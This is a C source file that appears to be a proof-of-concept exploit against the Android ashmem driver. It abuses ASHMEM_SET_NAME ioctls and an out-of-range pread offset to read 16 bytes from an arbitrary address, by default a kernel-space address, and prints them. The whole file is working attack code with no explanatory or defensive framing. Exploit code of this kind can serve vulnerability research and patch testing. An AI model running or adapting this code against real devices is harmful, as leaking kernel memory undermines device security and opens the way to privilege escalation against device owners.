#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

#ifndef ASHMEM_NAME_LEN
#define ASHMEM_NAME_LEN 256
#endif
#ifndef __ASHMEMIOC
#define __ASHMEMIOC 0x77
#endif
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define NAME_BIAS 11
#define PREFIX_COUNT 0x6d6873612f766564ULL

int main(int argc, char **argv) {
  uint64_t read_addr = 0xffffff8000801000ULL;
  if (argc > 1) {
    read_addr = strtoull(argv[1], NULL, 16);
  }
  char path[256] = "/dev/ashmem";
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0 || 1) {
    char bid[128];
    int bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    if (bf >= 0) {
      ssize_t n = read(bf, bid, sizeof(bid) - 1);
      close(bf);
      if (n > 0) {
        bid[n > 0 ? n : 0] = 0;
        char nl[3] = {0};
        (void)nl;
        bid[strcspn(bid, "\r\n")] = 0;
        snprintf(path, sizeof(path), "/dev/ashmem/%s", bid);
        int fd2 = open(path, O_RDWR | O_CLOEXEC);
        if (fd2 >= 0) {
          if (fd >= 0) {
            close(fd);
          }
          fd = fd2;
        }
      }
    }
  }
  if (fd < 0) {
    printf("open ashmem failed errno=%d path=%s\n", errno, path);
    return 2;
  }
  printf("ashmem path=%s\n", path);
  unsigned char raw[ASHMEM_NAME_LEN];
  memset(raw, 0, sizeof(raw));
  off_t pos = (off_t)(PREFIX_COUNT - 16);
  uint64_t page_val = read_addr - (uint64_t)pos;
  memcpy(raw + (16 - NAME_BIAS), &page_val, sizeof(page_val));
  unsigned char nm[ASHMEM_NAME_LEN];
  memset(nm, 0x20, sizeof(nm));
  for (int i = 0; i < 128; i++) {
    nm[i] = raw[i] ? raw[i] : 0x20;
  }
  ioctl(fd, ASHMEM_SET_NAME, nm);
  for (int i = 128; i > 0; i--) {
    if (raw[i - 1] != 0) {
      continue;
    }
    unsigned char z[ASHMEM_NAME_LEN];
    memset(z, 0x20, sizeof(z));
    for (int k = 0; k < i - 1; k++) {
      z[k] = raw[k] ? raw[k] : 0x20;
    }
    z[i - 1] = 0;
    ioctl(fd, ASHMEM_SET_NAME, z);
  }

  unsigned char out[16];
  memset(out, 0, sizeof(out));
  ssize_t rd = pread(fd, out, 16, pos);
  printf("pread rd=%zd errno=%d data=", rd, errno);
  for (int i = 0; i < 16; i++) {
    printf("%02x", out[i]);
  }
  printf("\n");
  close(fd);
  return 0;
}
